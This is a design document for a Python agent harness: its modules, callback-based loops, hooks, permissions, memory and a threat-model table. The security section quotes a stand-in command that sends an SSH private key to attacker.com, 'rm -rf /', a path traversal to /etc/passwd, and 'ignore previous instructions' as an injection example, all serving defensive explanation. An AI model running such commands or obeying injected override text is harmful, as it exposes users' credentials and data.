# Architecture — Agent Harness

## Overview

The runtime loads an agent folder (markdown + config), runs a tool-using loop against an LLM provider, and gets out of the way. The interesting work lives in the agent folders, not in the Python code.

The guiding principle is elegant simplicity — least work, least friction, least surprise. Someone should be able to read any file and think "ah nice, I can use that." Features are files, not layers. Most files know only about the shared types. The project grows by adding files, not by modifying existing ones.

---

## File Structure

```
agent_harness/
  __init__.py          # exports run() and version
  __main__.py          # python -m agent_harness entry point
  types.py             # shared dataclasses: Message, Response, ToolCall, AgentConfig
  config.py            # load an agent folder into AgentConfig
  tools.py             # tool registry, schema generation, core tools, executor registry
  budget.py            # turn counting, token tracking, cost ceiling
  hooks.py             # deterministic pre/post safety hook chain
  network.py           # network exfiltration blocker with domain whitelist
  permissions.py       # tool approval: once, session, persistent
  memory.py            # long-term memory tools (save/recall/list)
  routing.py           # agent-as-tool with depth limiting
  session.py           # save/load conversation sessions as JSON
  context.py           # context window trimming
  scaffold.py          # agent folder scaffolding (init command)
  display.py           # rich console output
  log.py               # console + file logging setup
  trace.py             # structured JSONL trace per run
  cli.py               # cli arg parsing, repl, composition root
  providers/
    __init__.py        # provider registry (a dict)
    anthropic.py       # chat() for claude
    openai_provider.py # chat() for openai-compatible apis (inc. lm studio)
  loops/
    __init__.py        # loop registry (a dict)
    react.py           # standard react loop
    plan_execute.py    # plan-then-execute loop
    rewoo.py           # plan once, execute all, solve once
    reflection.py      # generate/critique/refine
    eval_optimize.py   # generate/score/improve
    ralph.py           # fresh context retries
    debate.py          # two perspectives argue, synthesise

tools/                   # project-level custom tools (Python, one function per file)
  word_count.py          # example: count words
  file_search.py         # example: glob file search

skills/                  # project-level shared skills (markdown + optional scripts)
  csv-analysis/
    SKILL.md             # how to analyse CSV files
  code-review/
    SKILL.md             # how to review code
    scripts/
      diff_summary.sh    # helper script invoked by the skill

agents/                  # agent folders
  my-agent/
    instructions.md      # what this agent does
    tools.md             # tool usage guidance (optional)
    config.yaml          # model, provider, tools list, loop pattern
    skills/              # agent-local skills (override shared by name)
      specialised/
        SKILL.md

tests/
  unit/
  integration/
  data/
```

---

## Dependency Graph

This is the constraint that keeps the project from rotting. Read as "X knows about Y."

```
                         types.py
                       /  |  |  \   \    \     \
                      v   v  v   v   v    v     v
               config tools budget hooks perms memory providers/*
                                                        
               loops/react.py ──> types.py
                              ──> tools.py (to call execute_tool)

               display.py ──> types.py

               cli.py ──> config.py
                      ──> loops/ (to pick a loop)
                      ──> display.py
```

### Dependency Matrix

Each row imports from the columns marked `x`. `.` means "uses through callbacks, not direct import."

```
                  types  config  tools  loops  display  (everything else)
types.py           -
config.py          x       -
tools.py           x              -
budget.py          x
hooks.py           x
permissions.py     x
memory.py          x
display.py         x
providers/*.py     x
loops/*.py         x              x
cli.py             .       x      .      x       x
```

Key points:
- **types.py imports nothing internal.** It's the root of everything.
- **Every feature file imports exactly one internal module: types.py.**
- **Loop files import exactly two: types.py and tools.py.**
- **cli.py is the composition root** — it wires things together through callbacks. It directly imports config, loops, and display. Everything else it touches through objects or function references.
- **No circular dependencies.** The graph is a star with types.py at the centre.

### What "flat" means in practice

Every feature module (budget, hooks, permissions, memory) is **inert by default**. A 5-line `config.yaml` with just name, provider, model, and tools gives you a working agent. The Budget object exists but never triggers. The Hooks object passes everything through. The Permissions object allows everything. No conditionals, no None checks — the objects are always present, they just do nothing unless activated by config.

Add `max_cost: 0.50` to config and the budget activates. Add `hooks: [dangerous_command_blocker]` and that hook activates. The complexity is opt-in, one line at a time.

This means a contributor reading `react.py` sees `on_budget(usage)` and knows: that's a callback, it might do something or nothing, I don't need to care.

---

## Shared Types (`types.py`)

The contract between all modules. Should stay under 60 lines.

```python
@dataclass
class ToolCall:
    id: str
    name: str
    arguments: dict[str, Any]

@dataclass
class ToolResult:
    tool_call_id: str
    output: str
    error: str | None = None

@dataclass
class Message:
    role: str              # "system", "user", "assistant", "tool"
    content: str = ""
    tool_calls: list[ToolCall] = field(default_factory=list)  # only on assistant messages
    tool_result: ToolResult | None = None                     # only on tool messages

@dataclass
class Response:
    message: Message
    usage: Usage
    stop_reason: str = ""  # "end_turn", "tool_use", "max_tokens"

@dataclass
class Usage:
    input_tokens: int = 0
    output_tokens: int = 0

@dataclass
class AgentConfig:
    name: str = ""
    provider: str = "anthropic"
    model: str = "claude-haiku-4-5-20251001"
    agent_dir: str = ""
    instructions: str = ""
    tools_guidance: str = ""
    tools: list[str] = field(default_factory=list)
    loop: str = "react"
    max_turns: int = 20
    max_cost: float = 1.0
    permissions: dict = field(default_factory=dict)
    hooks: dict = field(default_factory=dict)
```

That's the entire shared vocabulary.

---

## How Each Part Works

### Providers (`providers/`)

A provider is a single file that exports a `chat` function:

```python
def chat(messages: list[Message], tools: list[dict], **kwargs) -> Response:
```

It translates our `Message` objects to the provider's wire format, calls the API, and translates back to `Response`. Each provider handles its own schema differences internally (e.g. Anthropic uses `input_schema` where OpenAI uses `parameters`).

**Provider registry** (`providers/__init__.py`) is a dict:
```python
registry: dict[str, Callable] = {
    "anthropic": anthropic.chat,
    "openai": openai.chat,
}
```

LM Studio gets free support through the OpenAI provider with a `base_url` override in config. No separate provider needed.

**To add a provider**: write one file, implement `chat()`, add one line to the registry dict. No other files change.

### Tools (`tools.py`)

Three responsibilities:

1. **Schema generation**: Inspect a Python function's signature and docstring to produce JSON Schema tool definitions (following the OpenAI/Anthropic convention). Uses `inspect.signature` and `typing.get_type_hints`.

2. **Registry**: A `dict[str, Callable]` mapping tool names to functions.

3. **Built-in tools**:
   - `run_command(command: str) -> str` — split safely with `shlex.split()`, subprocess with no shell=True
   - `read_file(path: str) -> str` — read a file
   - `write_file(path: str, content: str) -> str` — write a file
   - `execute_code(code: str, language: str) -> str` — run python/bash with timeout
   - `save_memory(key: str, content: str) -> str` — write to memory/ folder
   - `recall_memory(key: str) -> str` — read from memory/ folder
   - `list_memories() -> str` — list saved memory keys
   - `run_agent(agent_name: str, message: str) -> str` — invoke another agent (enables routing)

**To add a tool**: write a function with type hints and a docstring. Register it. No other files change.

### Agent Loops (`loops/`)

A loop is a function with this signature:

```python
def run(
    chat_fn: Callable,
    messages: list[Message],
    tool_schemas: list[dict],
    config: AgentConfig,
    on_response: Callable | None = None,
    on_tool_call: Callable | None = None,
    on_budget: Callable | None = None,
) -> str:
```

The callbacks are how the loop connects to hooks, permissions, budget, and display **without importing those modules**. This is what keeps it flat — the loop only knows about types and tools. Everything else is passed in.

**ReAct** (`loops/react.py`): ~40 lines.
```
while not done and turns < max:
    response = chat_fn(messages, tool_schemas)
    on_response(response)                       # display
    if on_budget(response.usage): break         # cost check
    if response has tool_calls:
        for each tool_call:
            result = on_tool_call(tool_call)     # hooks + permissions + execution
            append result to messages
    else:
        done = True
return final text
```

**Plan-execute** (`loops/plan_execute.py`): Asks the LLM to make a plan first (no tools), then executes each step using the react loop.

**To add a loop pattern**: write one file, implement `run()`, add one line to the registry. No other files change.

### Config (`config.py`)

Loads an agent folder into `AgentConfig`. Reads `config.yaml`, `instructions.md`, and optionally `tools.md`. ~40 lines.

A typical `config.yaml`:
```yaml
name: research-assistant
provider: anthropic
model: claude-haiku-4-5-20251001
tools: [run_command, read_file, execute_code]
max_turns: 15
max_cost: 0.25
```

### Budget (`budget.py`)

Accumulates token usage per call and checks against limits. Each provider's pricing is stored here (costs per million tokens). The budget exposes a `record(usage) -> bool` method that returns True when the budget is exceeded.

Used by `cli.py` which passes `budget.record` as the `on_budget` callback to the loop. The loop doesn't know what a budget is — it just knows to stop when the callback returns True.

### Hooks (`hooks.py`)

Three deterministic checkpoint types:

- `before_tool_exec(tool_call) -> tool_call | None` — modify, block, or pass through
- `after_tool_exec(tool_call, result) -> result` — sanitise output
- `on_external_content(content, source) -> content` — scan for injection

Built-in defaults included:
- Dangerous command blocker (rejects `rm -rf`, `sudo`, etc.)
- Path traversal detector (rejects `../` escapes)
- Prompt injection scanner (flags common patterns in tool output)

Users add custom hooks as Python functions referenced in `config.yaml`.

### Permissions (`permissions.py`)

Tool approval before execution. Three tiers:

| Tier | Scope | How it works |
|------|-------|-------------|
| Ask once | Single invocation | Prompt user y/n before each tool call |
| Session allow | Until agent exits | "Always allow read_file this session" |
| Persistent allow | Per agent folder | Saved to `.permissions.yaml` in agent dir |

Config can declare `always_allow` and `always_ask` lists. First run in a new folder prompts for everything.

### Memory (`memory.py`)

Three levels, all files:

| Level | Storage | Lifetime |
|-------|---------|----------|
| Conversation | `messages` list in memory | Dies with session |
| Session persistence | JSON file | Save/resume across sessions |
| Long-term memory | Markdown files in `{agent_dir}/memory/` | Permanent until deleted |

Session persistence: `save_session(messages, path)` and `load_session(path)`. ~15 lines.

Long-term memory: exposed as tools (`save_memory`, `recall_memory`, `list_memories`) that read/write markdown files. The agent decides when to save or recall, guided by `instructions.md`.

If embedding-based retrieval is needed later, it's added as another tool (`recall_memory_semantic`) that searches the same files. Core unchanged.

### Routing

Routing is not a module. It emerges from things that already exist:

1. **`run_agent` tool**: One agent invokes another by name. The function loads the agent folder and runs it.
2. **`instructions.md`**: The orchestrator's instructions say when to delegate. ("For research tasks, use the researcher agent. For data questions, use the csv-analyser.")
3. **Hooks**: `before_tool_exec` can intercept and reroute deterministically (e.g. if a file path ends in `.csv`, redirect to the data agent).

Multi-hop routing (A → B → C) works because each agent is independent. All routing decisions are visible in the tool call log.

### Display (`display.py`)

Rich console output. Shows assistant responses as markdown, tool calls with arguments, tool results, and budget status. Provides the user input prompt. ~40 lines.

### CLI and REPL (`cli.py`)

The **composition root** — the one file that wires everything together.

```
parse args (agent_dir, optional prompt)
load config from agent folder
get provider from registry
get loop from registry
create budget, hooks, permissions
compose them into callbacks

if prompt given:
    single command mode — run loop once, print result
else:
    repl mode — input() loop until exit
```

This is where budget, hooks, and permissions get composed into the `on_tool_call` callback:

```python
def make_tool_handler(permissions, hooks):
    def handle(tool_call):
        tool_call = hooks.run_before_tool(tool_call)
        if blocked: return error
        if not permissions.check(tool_call): return denied
        result = execute_tool(tool_call)
        result = hooks.run_after_tool(tool_call, result)
        return result
    return handle
```

---

## Security Model

An agent with `run_command` has access to the user's shell. This is powerful and dangerous. The security model has multiple layers, all deterministic — no LLM decides what's safe.

### Attack surfaces and defences

| Attack surface | How it could happen | Defence |
|---------------|-------------------|---------|
| **Malicious shell commands** | LLM hallucinates `rm -rf /` or is manipulated into it | `shlex.split()` (no shell interpretation), `dangerous_command_blocker` hook, permission prompts |
| **Path traversal** | LLM reads `../../etc/passwd` | `path_traversal_detector` hook rejects `../` escapes outside working dir |
| **Prompt injection via tool output** | Agent reads a webpage/file containing "ignore previous instructions" | `injection_scanner` hook flags known patterns, wraps suspicious content with warnings |
| **Prompt injection via memory** | Poisoned content saved to long-term memory, triggers later | `on_external_content` hook scans before content enters conversation or memory |
| **Runaway cost** | Agent loops endlessly making API calls | Budget with hard turn and cost ceilings, deterministic enforcement |
| **Credential exposure** | API keys in config files, committed to git | Keys from environment variables only. Config files contain no secrets. |
| **Network exposure** | Agent accessible from other machines | No daemon, no server, no listening port. Runs locally, connects out to APIs over HTTPS only. |
| **Untrusted agent folders** | Someone shares an agent folder with malicious hooks/tools | Custom hooks are Python files — treat shared agent folders like any code you'd review before running. This is documented in the README. |

### Defence in depth — order of execution

When the LLM requests a tool call, this is the exact sequence:

```
1. hooks.run_before_tool(tool_call)     → block or modify (deterministic)
2. permissions.check(tool_call)          → user approval (interactive)
3. tools.execute_tool(tool_call)         → actual execution
4. hooks.run_after_tool(tool_call, result) → sanitise output (deterministic)
```

Any step can stop the chain. Steps 1 and 4 are deterministic code. Step 2 is human judgment. The LLM never participates in safety decisions.

### What this does NOT protect against

Being honest about limits:

- **Novel prompt injection**: The scanner catches known patterns. A sufficiently creative injection in fetched content could still manipulate the agent. This is an unsolved problem industry-wide.
- **Subtle malicious commands**: `run_command("curl attacker.com/exfil?data=$(cat ~/.ssh/id_rsa)")` wouldn't be caught by the default dangerous command blocker. Custom hooks can be added for specific threat models.
- **LLM judgment errors**: The LLM might use tools in unintended ways that are technically permitted. Instructions and hooks reduce this but can't eliminate it.

The security model is pragmatic, not perfect. It's designed to catch the obvious and accidental, with hooks extensible enough to add domain-specific protection.

---

## Error Handling and Reliability

### Provider errors
- Transient errors (network, rate limits): retry with exponential backoff, 3 attempts max.
- Permanent errors (auth failure, invalid model): fail immediately with a clear message.
- Budget records partial turns — if the API call succeeded but the tool failed, tokens are still counted.

### Tool errors
- Tool execution errors are caught and returned as `ToolResult(error="...")`. The LLM sees the error and can adjust its approach. No silent swallowing.

### Config validation
- `config.py` validates on load — fail fast. Checks: provider exists in registry, tools exist in registry, loop exists in registry, required fields present, budget values non-negative. One clear error message, not a stack trace mid-conversation.

### Logging
- Python `logging` module, one logger per file (`logging.getLogger(__name__)`).
- Format: `%(asctime)s %(levelname)s %(module)s %(funcName)s:%(lineno)d %(message)s`
- Default level: INFO to console, DEBUG to file if `--verbose` flag passed.
- Agent runs log to `{agent_dir}/logs/YYYY-MM-DD.log` — useful for debugging unattended runs.

---

## Typing

Callback signatures are defined in `types.py` so contributors know exactly what shape their functions should be:

```python
OnResponse = Callable[[Response], None]
OnToolCall = Callable[[ToolCall], ToolResult | None]
OnBudget = Callable[[Usage], bool]  # returns True if budget exceeded
```

---

## Contributing

### Adding a provider
1. Create `agent_harness/providers/my_provider.py`
2. Implement `def chat(messages, tools, **kwargs) -> Response`
3. Add one line to `providers/__init__.py` registry
4. Write a test. No other files change.

### Adding a tool
1. Write a function with type hints and a docstring
2. Register it in `tools.py` (built-in) or in a separate file (custom)
3. Write a test. No other files change.

### Adding a loop pattern
1. Create `agent_harness/loops/my_loop.py`
2. Implement `def run(chat_fn, messages, tool_schemas, config, ...) -> str`
3. Add one line to `loops/__init__.py` registry
4. Write a test. No other files change.

### Adding an example agent
1. Create `agents/my-agent/`
2. Write `instructions.md` and `config.yaml`
3. Optionally write `tools.md`
4. **No code changes at all.**

### Adding a hook
1. Write a function matching the hook signature
2. Reference it in `config.yaml`
3. No other files change.

---

## Architectural Invariants

Rules that prevent complexity creep. If code violates them, it gets refactored.

1. **types.py imports nothing internal.** It's the root. If it starts importing things, the architecture is broken.
2. **No file imports more than 2 internal modules.** cli.py gets a limited exemption as the composition root. If you need a third import, you're building a layer — stop and reconsider.
3. **Providers know only types.** A provider file imports types.py and its SDK. Nothing else from the project.
4. **Loops know only types and tools.** Everything else arrives as callbacks.
5. **Growth through addition.** Adding a provider, tool, loop, or agent touches at most one existing file (the relevant registry). If a contribution requires changing two or more existing files, the design is wrong.
6. **No wrapping, no base classes, no abstract factories.** Contracts are defined by function signatures in types.py. Implementations are standalone.
7. **Sync by default.** No async, no threads. If a provider SDK requires async, it calls `asyncio.run()` internally.
8. **Callbacks over imports.** The loop doesn't import budget. It receives `on_budget`. This is how flatness is maintained.
9. **Files over abstractions for state.** Memory is files. Sessions are JSON files. Permissions are a YAML file. No databases.
10. **Inert by default.** Every feature module (budget, hooks, permissions) always exists but does nothing unless activated by config. No None checks, no conditional imports, no feature flags. The zero-config path works because the defaults are passthrough.
11. **The agent folder is the product.** If a feature makes the runtime more capable but doesn't make agent folders better, question whether it belongs.

### Common pressures and how to respond

| Pressure | Response |
|----------|----------|
| "We need middleware" | Use a hook. Hooks are a flat list, not a chain. |
| "We need a base class for providers" | A provider is a function. No class needed. |
| "We need a plugin system" | The file system is the plugin system. Drop a file, add a registry line. |
| "We need dependency injection" | cli.py creates things and passes them. That's DI. No framework needed. |
| "We need a database for memory" | Memory is files. Add a search tool if needed. |
| "This file is too long" | Split into two files at the same level. Not into a module with layers. |
